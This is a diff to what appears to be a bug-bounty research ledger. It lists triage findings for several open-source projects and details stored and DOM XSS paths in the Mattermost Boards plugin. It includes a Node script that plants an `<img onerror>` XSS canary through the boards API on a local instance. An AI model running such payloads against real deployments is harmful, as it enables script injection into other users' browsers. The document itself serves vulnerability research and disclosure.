@@ -18,3 +18,60 @@ Strategy or be deleted.
 | 2026-05-05 | auth0/auth0.js | Re-evaluation (Sprint 103) — no new findings from engine upgrades; existing DOM XSS entries unchanged; swarm_exfil detector: no markers found | — | — | — | Re-scan with v10.2.0-rc.1 engine (P6-9 swarm_exfil Phase A added). No changes to existing ledger entries. Schema Taint Verification ceiling still applies to captcha.js and username-password.js entries. | No new exploitation pathways identified. |
 | 2026-05-05 | openai/codex | Re-evaluation (Sprint 103) — UnauthenticatedAuthProvider finding confirmed present in current HEAD | P3/Medium | $500–$2000 | 40% | `grep -n UnauthenticatedAuthProvider /tmp/codex/codex-rs/model-provider/src/auth.rs` | No change. Finding persists in current HEAD. P1-3 Command Execution witnesses do not apply (no command execution sink in this auth path). Approval ceiling same as prior sprint. |
 | 2026-05-05 | smartcontractkit/chainlink | Unpinned asset / supply-chain drift — `deployment/ccip/shared/bindings/usd_stablecoin/usd_stablecoin_metadata.go:7` | Critical | up to $100,000 | 41% | `curl -fsSL "<remote-url>" -o /tmp/janitor_asset_probe && sha256sum /tmp/janitor_asset_probe` | Live-fire `janitor hunt --submit-check` generated `SUBMISSION_security_unpinned_asset.md`. Elevation path: prove the fetched artifact is mutable under a stable URL without checksum or immutable digest pinning; if upstream asset rotation is permitted, downstream builds silently ingest attacker-replaced bytes. |
+
+## Triage Proxy — mattermost/mattermost-plugin-boards
+
+### Stored XSS via dangerouslySetInnerHTML — block editor ×9 components
+
+**Triage Defense:** This is not a generic markdown-rendering hypothesis; the taint path is concrete and persisted. The attacker-controlled parameter is the block editor `text` value submitted from the client editor. `mutator.changeBlockTitle(block.boardId, block.id, block.title, text, ...)` forwards that exact user-supplied `text` into `octoClient.patchBlock(boardId, blockId, {title: newTitle})`, which issues `PATCH /api/v2/boards/{boardId}/blocks/{blockId}` and stores the payload as the block `title`. On subsequent renders, multiple display components convert that stored `title` back into HTML with `Utils.htmlFromMarkdown(...)` and inject it through React `dangerouslySetInnerHTML`, including the board text renderer and the board unfurl flow after `getBlocksWithBlockID(...)` reloads the content. The sink is therefore linked to a specific Mattermost API parameter (`title` on the block patch request), not merely to local UI state. Any board member capable of editing a block can persist a payload that renders in another viewer’s browser.
+
+### DOM XSS — webapp/src/utils.ts:143
+
+**Triage Defense:** The original ledger row references a generic DOM helper, but current HEAD no longer proves an end-to-end attacker-controlled call into that helper from static analysis alone. The only surviving helper-shaped sink is `Utils.htmlToElement(html)`, and it is presently not called anywhere in the checked tree. That means the finding is not submission-grade on code shape alone. The remaining triage question is whether a runtime-only reflection path still feeds attacker-controlled board or channel content into an equivalent HTML helper after bundling or plugin composition. Until that reflection is observed, the approval ceiling should stay below direct-submission threshold.
+
+**Interrogation Script:** Run the following Node script against a local Mattermost + Boards instance. It uses the same API family the client already uses to write `board.description`, plants a deterministic canary, and prints the exact manual check needed to confirm or falsify reflection in the rendered UI.
+
+```js
+#!/usr/bin/env node
+const baseUrl = process.env.MM_BASE_URL;
+const token = process.env.MM_TOKEN;
+const boardId = process.env.MM_BOARD_ID;
+
+if (!baseUrl || !token || !boardId) {
+  console.error("Set MM_BASE_URL, MM_TOKEN, and MM_BOARD_ID.");
+  process.exit(1);
+}
+
+const canary = 'JANITOR_CANARY_<img src=x onerror=console.log("JANITOR_DOM_XSS")>';
+
+async function patchBoardDescription() {
+  const response = await fetch(
+    `${baseUrl.replace(/\\/$/, "")}/plugins/focalboard/api/v2/boards/${boardId}`,
+    {
+      method: "PATCH",
+      headers: {
+        Authorization: `Bearer ${token}`,
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({description: canary}),
+    },
+  );
+
+  if (!response.ok) {
+    const body = await response.text();
+    throw new Error(`PATCH failed: ${response.status} ${body}`);
+  }
+
+  const body = await response.json();
+  console.log("Stored description:", body.description);
+  console.log(
+    `Open ${baseUrl.replace(/\\/$/, "")}/boards/${boardId} and any RHS/preview surface that renders the board description. ` +
+      "If the literal canary is converted into a live <img> node or executes the onerror handler, the reflection path is confirmed."
+  );
+}
+
+patchBoardDescription().catch((error) => {
+  console.error(error);
+  process.exit(1);
+});
+```
